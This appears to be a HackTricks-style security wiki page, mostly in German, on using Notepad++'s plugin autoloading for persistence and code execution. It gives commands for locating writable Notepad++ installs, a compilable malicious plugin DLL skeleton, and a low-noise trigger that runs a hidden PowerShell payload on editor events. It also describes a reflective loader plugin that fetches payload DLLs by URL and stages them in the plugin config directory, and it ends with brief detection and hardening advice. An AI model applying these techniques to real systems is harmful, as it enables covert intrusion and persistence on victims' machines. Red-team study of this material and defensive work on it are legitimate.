# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ wird beim Start **jede plugin DLL automatisch laden, die in seinen `plugins`-Unterordnern gefunden wird**. Das Ablegen eines bösartigen plugins in einer **beschreibbaren Notepad++-Installation** verschafft code execution innerhalb von `notepad++.exe`, jedes Mal wenn der Editor startet, was für **persistence**, verdeckte **initial execution** oder als **in-process loader** missbraucht werden kann, wenn der Editor erhöht gestartet wird.

Seit **Notepad++ 7.6+** ist das erwartete manuelle Installationslayout **ein Unterordner pro plugin** (`plugins\<PluginName>\<PluginName>.dll`). Im **portable mode** (Vorhandensein von `doLocalConf.xml` neben `notepad++.exe`) bleibt der gesamte Anwendungspfad lokal in diesem Verzeichnis, wodurch kopierte/admin tool bundles oft zu einer einfach beschreibbaren execution surface werden.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (erfordert normalerweise admin zum Schreiben).
- Writable options for low-privileged operators:
- Verwende den **portable Notepad++ build** in einem user-writable Ordner.
- Kopiere `C:\Program Files\Notepad++` in einen user-controlled Pfad (z. B. `%LOCALAPPDATA%\npp\`) und starte `notepad++.exe` von dort.
- Suche nach **admin tool bundles**, extrahierten zip-Kopien oder help-desk toolkits, die bereits `doLocalConf.xml` enthalten und außerhalb von `Program Files` liegen.
- Jedes plugin bekommt seinen eigenen Unterordner unter `plugins` und wird beim Start automatisch geladen; Menüpunkte erscheinen unter **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin-Ladepunkte (Execution Primitives)
Notepad++ erwartet bestimmte **exportierte Funktionen**. Diese werden alle während der Initialisierung aufgerufen und bieten damit mehrere Execution Surfaces:
- **`DllMain`** — läuft sofort beim DLL-Load (erster Execution Point).
- **`setInfo(NppData)`** — wird beim Laden einmal aufgerufen, um Notepad++-Handles bereitzustellen; typischer Ort, um Menüeinträge zu registrieren.
- **`getName()`** — gibt den Plugin-Namen zurück, der im Menü angezeigt wird.
- **`getFuncsArray(int *nbF)`** — gibt Menübefehle zurück; selbst wenn leer, wird es beim Startup aufgerufen.
- **`beNotified(SCNotification*)`** — empfängt Notepad++ / Scintilla-Events (nützlich, um Payloads bis zu einer User-Action oder einem Editor-Event zu verzögern).
- **`messageProc(UINT, WPARAM, LPARAM)`** — Message-Handler, nützlich für größere Datenaustausche.
- **`isUnicode()`** — beim Laden geprüfte Kompatibilitätsmarkierung.

Die meisten Exports können als **stubs** implementiert werden; Execution kann aus `DllMain` oder einem beliebigen der obigen Callbacks während Autoload erfolgen.

## Minimaler bösartiger Plugin-Skeleton
Kompiliere eine DLL mit den erwarteten Exports und platziere sie unter `plugins\\MyNewPlugin\\MyNewPlugin.dll` in einem beschreibbaren Notepad++-Ordner:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Baue die DLL (Visual Studio/MinGW).
2. Erstelle den Plugin-Unterordner unter `plugins` und lege die DLL hinein.
3. Starte Notepad++ neu; die DLL wird automatisch geladen, wodurch `DllMain` und die nachfolgenden Callbacks ausgeführt werden.

## Low-noise Trigger-Pattern via `beNotified`
Für OPSEC sollten viele Payloads **nicht** aus `DllMain` ausgelöst werden. Ein unauffälligeres Muster ist, das Plugin sauber laden zu lassen und dann erst nach einem realistischen Editor-Event auszuführen, z. B. **startup complete**, **buffer activation** oder dem **ersten getippten Zeichen**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Dies passt besser zu öffentlicher offensiver Forschung als ein lautes `DllMain`-Beacon: Die DLL wird beim Start weiterhin automatisch geladen, aber die bösartige Aktion wird verzögert, bis Notepad++ tatsächlich in Benutzung wirkt.

## Using the plugin config directory as secondary storage
Notepad++ stellt `NPPM_GETPLUGINSCONFIGDIR` bereit, das das **Plugin-Konfigurationsverzeichnis des aktuellen Benutzers** zurückgibt. Ein bösartiges Plugin kann dies nutzen, um die auf der Festplatte gespeicherte DLL minimal zu halten, während verschlüsselte Konfigurationen, staged Payloads oder tasking-Dateien in einem Pfad gespeichert werden, der sich unauffällig in den normalen Plugin-Zustand einfügt.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operativ ist das nützlich, wenn du möchtest:
- eine winzige autoloaded bootstrap DLL;
- per-user tasking, ohne das main plugin binary erneut anzufassen;
- den **autoload trigger** vom schwereren second stage zu trennen.

## Reflective loader plugin pattern
Ein weaponized plugin kann Notepad++ in einen **reflective DLL loader** verwandeln:
- Eine minimale UI-/Menüeintragung bereitstellen (z. B. "LoadDLL").
- Einen **file path** oder eine **URL** akzeptieren, um eine payload DLL abzurufen.
- Die DLL reflektiv in den aktuellen Prozess mappen und einen exportierten Einstiegspunkt aufrufen (z. B. eine loader function innerhalb der abgerufenen DLL).
- Vorteil: einen harmlos wirkenden GUI-Prozess wiederverwenden, statt einen neuen loader zu starten; die payload erbt die Integrität von `notepad++.exe` (einschließlich erhöhter Kontexte).
- Trade-offs: Das Ablegen einer **unsignierten plugin DLL** auf der Festplatte ist auffällig; eine praktische Variante ist, das autoloaded plugin nur als Stub zu verwenden und das eigentliche implant verschlüsselt/staged anderswo zu halten.

## Detection and hardening notes
- Schreibe in **Notepad++ plugin directories** (einschließlich portabler Kopien in Benutzerprofilen) blockieren oder überwachen; Controlled Folder Access oder Application Allowlisting aktivieren.
- Auf **neue unsignierte DLLs** unter `plugins`, Änderungen an portablen Notepad++-Bäumen und ungewöhnliche **Child Processes/Network Activity** von `notepad++.exe` alarmieren.
- Legitime Plugins baselinen und jede neue DLL untersuchen, die zwar die normale Notepad++ plugin interface exportiert, aber auch Shells, PowerShell oder network beacons startet.
- Die Installation von Plugins nur über **Plugins Admin** erzwingen und die Ausführung portabler Kopien aus nicht vertrauenswürdigen Pfaden einschränken.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
